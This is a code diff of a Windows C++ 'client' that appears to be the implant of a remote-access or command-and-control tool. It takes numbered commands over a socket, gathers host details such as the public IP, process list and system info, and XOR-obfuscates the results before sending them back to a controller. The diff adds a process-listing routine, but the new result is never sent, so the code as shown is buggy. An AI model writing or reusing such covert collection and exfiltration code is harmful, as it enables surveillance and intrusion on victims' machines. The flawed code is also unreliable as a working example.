@@ -29,6 +29,8 @@ g++.exe -fdiagnostics-color=always -g client.cpp -o client.exe -lwsock32 -lrpcrt
 #include <rpc.h>
 // newly added
 #include <tchar.h>
+#include <comdef.h>
+#include <locale>
 #pragma comment(lib, "Ws2_32.lib")
 #pragma comment(lib, "Wininet.lib")
 #pragma comment(lib, "IPHLPAPI.lib")
@@ -141,76 +143,48 @@ std::string getPublicIP() {
 
 // sample ListProcesses function maybe
 
-string getRunningProcesses( );
+wstring GetProcessList( );
 BOOL ListProcessModules( DWORD dwPID );
 BOOL ListProcessThreads( DWORD dwOwnerPID );
 void printError( const TCHAR* msg );
 
-std::string getRunningProcesses() {
+std::wstring GetProcessList()
+{
+    std::wstring processList;
 
-	HANDLE hProcessSnap;
-	HANDLE hProcess;
-	PROCESSENTRY32 pe32;
-	DWORD dwPriorityClass;
-
-	// Take a snapshot of all processes in the system.
-	hProcessSnap = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
-	if( hProcessSnap == INVALID_HANDLE_VALUE )
-	{
-		printError( TEXT("CreateToolhelp32Snapshot (of processes)") );
-    	return( FALSE );
-  	}
-
-	// Set the size of the structure before using it.
-	pe32.dwSize = sizeof( PROCESSENTRY32 );
-
-	// Retrieve information about the first process,
-	// and exit if unsuccessful
-	if( !Process32First( hProcessSnap, &pe32 ) )
-	{
-		printError( TEXT("Process32First") ); // show cause of failure
-		CloseHandle( hProcessSnap );          // clean the snapshot object
-		return( FALSE );
-	}
-
-	// Now walk the snapshot of processes, and
-	// display information about each process in turn
-	do
-  	{
-		_tprintf( TEXT("\n\n=====================================================" ));
-    	_tprintf( TEXT("\nPROCESS NAME:  %s"), pe32.szExeFile );
-    	_tprintf( TEXT("\n-------------------------------------------------------" ));
-
-    	// Retrieve the priority class.
-    	dwPriorityClass = 0;
-    	hProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID );
-    	if( hProcess == NULL )
-      	printError( TEXT("OpenProcess") );
-    else
+    // Create a snapshot of the current processes
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE)
     {
-      dwPriorityClass = GetPriorityClass( hProcess );
-      if( !dwPriorityClass )
-    	printError( TEXT("GetPriorityClass") );
-      CloseHandle( hProcess );
+        // Error: Failed to create snapshot
+        processList = L"Failed to create snapshot";
+        return processList;
     }
 
-    _tprintf( TEXT("\n  Process ID        = 0x%08X"), pe32.th32ProcessID );
-    _tprintf( TEXT("\n  Thread count      = %d"),   pe32.cntThreads );
-    _tprintf( TEXT("\n  Parent process ID = 0x%08X"), pe32.th32ParentProcessID );
-    _tprintf( TEXT("\n  Priority base     = %d"), pe32.pcPriClassBase );
-    if( dwPriorityClass )
-      _tprintf( TEXT("\n  Priority class    = %d"), dwPriorityClass );
+    // Get information about the first process in the snapshot
+    PROCESSENTRY32 pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+    if (!Process32First(hSnapshot, &pe32))
+    {
+        // Error: Failed to retrieve process information
+        processList = L"Failed to retrieve process information";
+        CloseHandle(hSnapshot);
+        return processList;
+    }
 
-    // List the modules and threads associated with this process
-    ListProcessModules( pe32.th32ProcessID );
-    ListProcessThreads( pe32.th32ProcessID );
+    // Loop through all processes in the snapshot and append their names to the processList string
+    do
+    {
+        std::wstring processName = pe32.szExeFile;
+        processList += processName + L"\n";
+    } while (Process32Next(hSnapshot, &pe32));
 
-  	} while( Process32Next( hProcessSnap, &pe32 ) );
+    // Close the snapshot handle
+    CloseHandle(hSnapshot);
 
-  		CloseHandle( hProcessSnap );
-  			exit;
+    return processList;
 }
-// helper functions for list processes
+
 
 BOOL ListProcessModules( DWORD dwPID )
 {
@@ -246,7 +220,7 @@ BOOL ListProcessModules( DWORD dwPID )
     _tprintf( TEXT("\n     Process ID     = 0x%08X"),         me32.th32ProcessID );
     _tprintf( TEXT("\n     Ref count (g)  = 0x%04X"),     me32.GlblcntUsage );
     _tprintf( TEXT("\n     Ref count (p)  = 0x%04X"),     me32.ProccntUsage );
-/*   _tprintf( TEXT("\n     Base address   = 0x%08X"), (DWORD) me32.modBaseAddr ); */
+    _tprintf( TEXT("\n     Base address   = 0x%08X"), (DWORD) me32.modBaseAddr );
     _tprintf( TEXT("\n     Base size      = %d"),             me32.modBaseSize );
 
   } while( Module32Next( hModuleSnap, &me32 ) );
@@ -614,6 +588,7 @@ int main() {
 
 	while (true) {
 		std::string data;
+		std::wstring data2;
 		int offset = 0;
 		int getcmd;
 		memset(buf, 0, DEFAULT_BUFLEN);
@@ -675,27 +650,28 @@ int main() {
 
 		//new case for getRunningProcess;
 		case 2: {
-			printf("processes\n");
-			printf("debugggggg\n");
-			data = getRunningProcesses();
-			//data = "No Processes Found";
-			//printf("list processes length: %d\n", data.length()); //debug
-			printf("debugggggg2222\n");
-			_tprintf( TEXT("\nPROCESS NAME:  %s"), data );
-			while (offset < data.length()) {
-				string chunk = data.substr(offset, DEFAULT_BUFLEN);
-				char* c = const_cast<char*>(chunk.c_str()); // convert chunk to c_str
-				xor_func(c); // xor the chunk
-				const char* chunkBuffer = c; // put xor'd chunk in this temp buffer
-				printf("sending %d bytes\n", strlen(chunkBuffer)); //debug
-				send(sock, chunkBuffer, strlen(chunkBuffer), 0);
-				offset += DEFAULT_BUFLEN;
-			}
-			strcpy(buf, "gettfouttahereistfg"); // send string to signify end of message
-			xor_func(buf);
-			send(sock, buf, strlen(buf), 0);
+            printf("processes\n");
+            printf("debugggggg\n");
+			wstring data2 = GetProcessList();
+            //data = GetProcessList();
+            //data = "No Processes Found";
+            //printf("list processes length: %d\n", data.length()); //debug
+            printf("debugggggg2222\n");
+            _tprintf( TEXT("\nPROCESS NAME:  %s"), data );
+            while (offset < data.length()) {
+                string chunk = data.substr(offset, DEFAULT_BUFLEN);
+                char* c = const_cast<char*>(chunk.c_str()); // convert chunk to c_str
+                xor_func(c); // xor the chunk
+                const char* chunkBuffer = c; // put xor'd chunk in this temp buffer
+                printf("sending %d bytes\n", strlen(chunkBuffer)); //debug
+                send(sock, chunkBuffer, strlen(chunkBuffer), 0);
+                offset += DEFAULT_BUFLEN;
+            }
+            strcpy(buf, "gettfouttahereistfg"); // send string to signify end of message
+            xor_func(buf);
+            send(sock, buf, strlen(buf), 0);
 
-		} break;
+        } break;
 
 		case 3: {
 			printf("systeminfo\n");
